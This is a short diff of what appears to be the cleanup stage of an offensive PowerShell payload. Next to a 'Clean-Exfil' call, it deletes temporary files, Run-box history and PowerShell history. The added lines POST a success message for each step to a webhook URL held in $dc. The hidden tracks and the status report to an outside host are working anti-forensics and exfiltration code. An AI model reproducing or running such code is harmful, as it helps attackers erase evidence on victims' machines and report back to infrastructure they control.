@@ -88,9 +88,10 @@ if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; if ($?) {if (-not ([string]::IsNullOrEmpty($dc))){Invoke-RestMethod -Uri $dc -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Run history removed`"}"}}
+
 
 # Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue; if ($?) {if (-not ([string]::IsNullOrEmpty($dc))){Invoke-RestMethod -Uri $dc -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Powershell history removed`"}"}}
 
 
